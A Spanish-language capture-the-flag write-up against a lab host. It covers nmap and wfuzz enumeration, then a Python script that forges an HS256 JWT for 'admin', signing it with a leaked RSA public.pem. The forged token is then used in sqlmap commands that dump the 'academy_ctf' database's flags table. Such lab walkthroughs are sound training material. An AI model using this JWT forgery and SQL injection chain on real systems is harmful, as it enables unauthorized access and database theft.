
como primer paso realizamos reconocimiento de los puesto como podemos observar 
```
nmap -p- --open -sCV -Pn -n --min-rate 5000 192.168.100.164
```
![[Pasted image 20261002205857.png]]

```
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hh 4345 --follow -t 50 http://192.168.100.164:8080/FUZZ
```

![[Pasted image 20261002230914.png]]

```wfuzz -c \
-w /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-u "http://192.168.100.164:8080/keys/FUZZ.pem" \
--sc 200 \
--hh 79 \
-t 20
```


![[Pasted image 20261002231155.png]]

```
http://192.168.100.164:8080/keys/public.pem
```
![[Pasted image 20261002231227.png]]




y creamos el siguiente codigo para realizar explotacion en pythos   


import json, base64, hmac, hashlib
```
# Functions
def b64url_encode(data):
    s = base64.urlsafe_b64encode(data).rstrip(b"=")
    return s.decode("ascii")

def b64url_encode_json(obj):
    j = json.dumps(obj, separators=(',', ':'), sort_keys=True)
    return b64url_encode(j.encode('utf-8'))

def hmac_sha256(key, msg):
    return hmac.new(key, msg, hashlib.sha256).digest()

def build_token(header_obj, payload_obj, key_bytes):
    encoded_header = b64url_encode_json(header_obj)
    encoded_payload = b64url_encode_json(payload_obj)
    signing_input = (encoded_header + "." + encoded_payload).encode('ascii')
    sig = hmac_sha256(key_bytes, signing_input)
    encoded_sig = b64url_encode(sig)
    return f"{encoded_header}.{encoded_payload}.{encoded_sig}"


# Open public.pem
with open("public.pem", "rb") as file:
        key_bytes=file.read()

# Create JWT
header = {"alg": "HS256", "typ": "JWT"}

payload = {"username": "admin"},

token= build_token(header,payload, key_bytes)

print("Token--> " + token)
```

ejecutamos   el codigo expliot con el public,pem 

![[Pasted image 20261002230613.png]]

```
 curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY " "http://192.168.100.164:8080/api/courses.php?q=1"

```
![[Pasted image 20261003003806.png]]
para ver si podemos ingresar en la base de datos con tokes  

```
sqlmap -u "http://192.168.100.164:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" --dump --batch
```

Realizamos la Explotacion a traves de sqlmap  y el pasamos el token  y nos muestra la base de datos 

```
sqlmap --url "http://192.168.100.164:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" --dbs --batch
```

![[Pasted image 20261003001222.png]]

encontramos tablas donde podemis realizar la conextiones  
```
sqlmap --url "http://192.168.100.164:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" -D academy_ctf --tables --batch
```

![[Pasted image 20261003002404.png]]

```
sqlmap --url "http://192.168.100.164:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" -D academy_ctf -T flags --columns --no-cast --batch
```

![[Pasted image 20261003002841.png]]

como podemos ver  encontramos  tablas para realizar la subida de privilegio  
```
sqlmap --url "http://192.168.100.164:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" -D academy_ctf -T flags -C name,flag_value  --dump --no-cast --batch
```

y encontramos flag  root y de usuario 

![[Pasted image 20261003003323.png]]